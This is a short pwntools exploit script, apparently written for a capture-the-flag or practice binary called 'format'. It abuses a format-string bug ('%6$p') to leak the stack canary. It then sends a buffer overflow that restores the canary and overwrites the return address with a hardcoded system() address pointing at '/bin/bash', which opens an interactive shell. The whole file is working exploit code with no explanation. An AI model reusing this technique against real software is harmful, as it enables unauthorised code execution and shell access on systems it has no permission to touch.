from pwn import *

t = process(["/home/elklepo/repos/pwn/custom/format"])
#gdb.attach(t, '''
#br *0x080489bc
#c
#''')
sleep(0.5)
t.sendline('jaca')
t.sendline('%6$p/bin/bash')
_ = t.readuntil("name? ")
canary = int(t.read(10), 16)
buff = packing.p32(0x080dbe28 + 4)
system = packing.p32(0x0804fcf0)
t.sendline('A' * 64 + packing.p32(canary) + 'P' * 4 * 3 + system + 'P' * 4 + buff)
t.interactive()
print t.readall()

